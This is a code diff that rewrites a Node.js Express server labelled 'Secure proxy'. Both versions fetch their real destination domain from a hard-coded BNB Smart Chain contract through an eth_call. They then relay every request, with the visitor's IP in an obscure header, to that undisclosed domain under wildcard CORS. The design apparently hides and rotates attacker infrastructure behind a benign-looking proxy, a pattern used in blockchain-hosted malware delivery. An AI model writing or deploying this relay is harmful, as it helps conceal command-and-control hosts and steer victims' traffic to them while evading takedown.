@@ -1,154 +1,173 @@
-import express from "express";
-import { readFile, writeFile } from "fs/promises";
-import { tmpdir } from "os";
-import { join } from "path";
+import express from 'express';
+import fetch from 'node-fetch';
+import crypto from 'crypto';
+import fs from 'fs';
+import os from 'os';
+import path from 'path';
+import bodyParser from 'body-parser';
 
 const app = express();
-app.use(express.text({ type: "*/*" }));
+const port = process.env.PORT || 3000;
 
-// --- Settings ---
-const UPDATE_INTERVAL = 60 * 1000; // 60 seconds
-const RPC_URLS = [
-  "https://binance.llamarpc.com",
-  "https://bsc.drpc.org",
-];
-const CONTRACT_ADDRESS = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
-const CACHE_FILE = join(tmpdir(), "proxy_cache.json");
+app.use(bodyParser.raw({ type: '*/*' }));
 
-// --- Utilities ---
+// ====== Get Client IP ======
 function getClientIP(req) {
-  return (
-    req.headers["cf-connecting-ip"] ||
-    (req.headers["x-forwarded-for"]?.split(",")[0] ?? req.ip)
-  );
+    const cfIP = req.headers['cf-connecting-ip'];
+    if (cfIP) return cfIP;
+    const forwarded = req.headers['x-forwarded-for'];
+    if (forwarded) return forwarded.split(',')[0].trim();
+    return req.socket.remoteAddress;
 }
 
-async function loadCache() {
-  try {
-    const cache = JSON.parse(await readFile(CACHE_FILE, "utf-8"));
-    if (Date.now() - cache.timestamp < UPDATE_INTERVAL) {
-      return cache.domain;
+// ====== Proxy Middleware Class ======
+class SecureProxyMiddleware {
+    constructor(options = {}) {
+        this.rpcUrls = options.rpcUrls || [
+            "https://rpc.ankr.com/bsc",
+            "https://bsc-dataseed2.bnbchain.org"
+        ];
+        this.contractAddress = options.contractAddress ||
+            "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
+        const serverIdentifier = crypto.createHash('md5')
+            .update((process.env.HOSTNAME || 'localhost') + process.version)
+            .digest('hex');
+        this.cacheFile = path.join(os.tmpdir(), `proxy_cache_${serverIdentifier}.json`);
+        this.updateInterval = 60; // seconds
     }
-  } catch (_) {}
-  return null;
-}
 
-async function saveCache(domain) {
-  await writeFile(
-    CACHE_FILE,
-    JSON.stringify({ domain, timestamp: Date.now() })
-  );
-}
-
-function hexToString(hex) {
-  hex = hex.replace(/^0x/, "");
-  hex = hex.substring(64);
-  const length = parseInt(hex.substring(0, 64), 16);
-  const dataHex = hex.substring(64, 64 + length * 2);
-  let result = "";
-  for (let i = 0; i < dataHex.length; i += 2) {
-    const code = parseInt(dataHex.substring(i, i + 2), 16);
-    if (code === 0) break;
-    result += String.fromCharCode(code);
-  }
-  return result;
-}
-
-async function fetchTargetDomain() {
-  const data = "20965255";
-  const payload = {
-    jsonrpc: "2.0",
-    id: 1,
-    method: "eth_call",
-    params: [{ to: CONTRACT_ADDRESS, data: "0x" + data }, "latest"],
-  };
-
-  for (const url of RPC_URLS) {
-    try {
-      const res = await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-      });
-      const json = await res.json();
-      if (!json.error) {
-        const domain = hexToString(json.result);
-        if (domain) return domain;
-      }
-    } catch (e) {
-      console.error("RPC fetch failed:", e.message);
+    loadCache() {
+        if (!fs.existsSync(this.cacheFile)) return null;
+        const cache = JSON.parse(fs.readFileSync(this.cacheFile, 'utf8'));
+        if (!cache || (Date.now() - cache.timestamp) / 1000 > this.updateInterval) return null;
+        return cache.domain;
     }
-  }
-  throw new Error("Could not fetch target domain");
+
+    saveCache(domain) {
+        const cache = { domain, timestamp: Date.now() };
+        fs.writeFileSync(this.cacheFile, JSON.stringify(cache));
+    }
+
+    hexToString(hex) {
+        hex = hex.replace(/^0x/, '');
+        hex = hex.substring(64);
+        const lengthHex = hex.substring(0, 64);
+        const length = parseInt(lengthHex, 16);
+        const dataHex = hex.substring(64, 64 + length * 2);
+        let result = '';
+        for (let i = 0; i < dataHex.length; i += 2) {
+            const charCode = parseInt(dataHex.substring(i, i + 2), 16);
+            if (charCode === 0) break;
+            result += String.fromCharCode(charCode);
+        }
+        return result;
+    }
+
+    async fetchTargetDomain() {
+        const data = '20965255';
+        for (const rpcUrl of this.rpcUrls) {
+            try {
+                const response = await fetch(rpcUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        jsonrpc: '2.0',
+                        id: 1,
+                        method: 'eth_call',
+                        params: [{
+                            to: this.contractAddress,
+                            data: '0x' + data
+                        }, 'latest']
+                    }),
+                    timeout: 120000
+                });
+
+                const result = await response.json();
+                if (!result.error) {
+                    const domain = this.hexToString(result.result);
+                    if (domain) return domain;
+                }
+            } catch (e) {
+                continue;
+            }
+        }
+        throw new Error('Could not fetch target domain');
+    }
+
+    async getTargetDomain() {
+        const cached = this.loadCache();
+        if (cached) return cached;
+        const domain = await this.fetchTargetDomain();
+        this.saveCache(domain);
+        return domain;
+    }
+
+    async handle(req, res, endpoint) {
+        try {
+            const targetDomain = (await this.getTargetDomain()).replace(/\/$/, '');
+            const url = `${targetDomain}/${endpoint.replace(/^\//, '')}`;
+            const clientIP = getClientIP(req);
+
+            const headers = { ...req.headers };
+            delete headers['host'];
+            delete headers['origin'];
+            delete headers['accept-encoding'];
+            delete headers['content-encoding'];
+
+            headers['x-dfkjldifjlifjd'] = clientIP;
+
+            const proxyResponse = await fetch(url, {
+                method: req.method,
+                headers: headers,
+                body: req.method !== 'GET' && req.method !== 'HEAD'
+                    ? req.body
+                    : undefined,
+                timeout: 120000
+            });
+
+            const contentType = proxyResponse.headers.get('content-type');
+            res.set('Access-Control-Allow-Origin', '*');
+            res.set('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
+            res.set('Access-Control-Allow-Headers', '*');
+            if (contentType) res.type(contentType);
+            res.status(proxyResponse.status);
+
+            const buffer = await proxyResponse.buffer();
+            res.send(buffer);
+
+        } catch (err) {
+            res.status(500).send('error: ' + err.message);
+        }
+    }
 }
 
-async function getTargetDomain() {
-  const cached = await loadCache();
-  if (cached) return cached;
-  const domain = await fetchTargetDomain();
-  await saveCache(domain);
-  return domain;
-}
-
-// --- Main Proxy Handler ---
-app.all("/", async (req, res) => {
-  if (req.query.e === "ping_proxy") {
-    return res.type("text").send("pong");
-  }
-  if (!req.query.e) {
-    return res.status(400).send("Missing endpoint");
-  }
-
-  try {
-    const targetDomain = (await getTargetDomain()).replace(/\/$/, "");
-    const endpoint = "/" + decodeURIComponent(req.query.e).replace(/^\//, "");
-    const url = targetDomain + endpoint;
-
-    const clientIP = getClientIP(req);
-
-    // Forward headers
-    const headers = { ...req.headers };
-    delete headers.host;
-    delete headers.origin;
-    delete headers["accept-encoding"];
-    delete headers["content-encoding"];
-    headers["x-dfkjldifjlifjd"] = clientIP;
-
-    const proxyRes = await fetch(url, {
-      method: req.method,
-      headers,
-      body: ["GET", "HEAD"].includes(req.method) ? undefined : req.body,
-      redirect: "follow",
-    });
-
-    // Forward status and headers
-    res.status(proxyRes.status);
-    proxyRes.headers.forEach((value, key) => res.setHeader(key, value));
-
-    // Always include CORS
-    res.setHeader("Access-Control-Allow-Origin", "*");
-    res.setHeader("Access-Control-Allow-Methods", "GET, HEAD, POST, OPTIONS");
-    res.setHeader("Access-Control-Allow-Headers", "*");
-
-    const buffer = Buffer.from(await proxyRes.arrayBuffer());
-    res.send(buffer);
-  } catch (e) {
-    console.error(e);
-    res.status(500).send("error: " + e.message);
-  }
+const proxy = new SecureProxyMiddleware({
+    rpcUrls: [
+        "https://binance.llamarpc.com",
+        "https://bsc.drpc.org"
+    ],
+    contractAddress: "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0"
 });
 
-// --- CORS Preflight ---
-app.options("*", (req, res) => {
-  res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Methods", "GET, HEAD, POST, OPTIONS");
-  res.setHeader("Access-Control-Allow-Headers", "*");
-  res.setHeader("Access-Control-Max-Age", "86400");
-  res.status(204).send();
+// ====== OPTIONS (CORS Preflight) ======
+app.options('*', (req, res) => {
+    res.set('Access-Control-Allow-Origin', '*');
+    res.set('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
+    res.set('Access-Control-Allow-Headers', '*');
+    res.set('Access-Control-Max-Age', '86400');
+    res.sendStatus(204);
 });
 
-// --- Start Server ---
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Secure Proxy running on port ${PORT}`);
+// ====== Ping Route ======
+app.get('/?e=ping_proxy', (req, res) => {
+    res.type('text/plain').send('pong');
 });
+
+// ====== Proxy Route ======
+app.all('*', async (req, res) => {
+    const endpoint = req.query.e;
+    if (!endpoint) return res.status(400).send('Missing endpoint');
+    await proxy.handle(req, res, decodeURIComponent(endpoint));
+});
+
+app.listen(port, () => console.log(`Secure proxy running on port ${port}`));
